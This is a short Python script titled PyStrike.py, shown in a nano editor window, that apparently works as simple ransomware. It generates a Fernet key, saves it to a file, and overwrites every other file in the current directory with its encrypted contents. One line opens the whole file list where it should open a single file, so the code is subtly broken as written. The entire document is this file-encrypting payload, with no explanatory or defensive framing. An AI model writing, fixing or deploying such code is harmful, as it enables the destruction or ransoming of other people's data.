  GNU nano 5.4                                                               PyStrike.py                                                                        
from cryptography.fernet import Fernet
import os
files = []
for file in os.listdir():
    if file == "PyStrike.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
        thekey.write(key)
for file in files:
        with open(files, "rb")as thefile:
                contents = thefile.read()
        encryption = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(encryption)
